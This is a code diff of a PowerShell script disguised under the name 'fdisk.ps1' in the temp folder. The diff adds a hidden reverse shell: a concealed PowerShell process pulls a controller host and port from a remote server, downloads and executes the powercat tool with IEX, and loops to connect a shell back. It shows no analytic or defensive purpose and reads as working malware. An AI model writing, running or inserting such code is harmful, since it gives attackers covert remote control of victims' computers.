@@ -33,14 +33,17 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 		Get-Job | Receive-Job | Out-File $strFileName
 	}
 
-	
-	# shell reverse
-	start-process -WindowStyle Hidden powershell @"
-		While(1){
+
+	# reverse shell
+    start-process -WindowStyle Hidden powershell @'
+        $server = "http://1.nekocode.sinaapp.com/my_host"
+        $info = Invoke-RestMethod -Method Get -Uri $server
+
+        While(1){
 			Try {
 				start-job {
 					IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
-					powercat -c 192.168.10.99 -p 8099 -ep
+					powercat -c $info.host -p $info.port -ep
 				}
 				get-job | wait-job
 			}
@@ -48,7 +51,7 @@ if($MyInvocation.MyCommand.Path -eq "$env:temp\fdisk.ps1") {
 			}
 			Start-Sleep -Seconds 3
 		}
-"@
+'@
 	
 	
 	
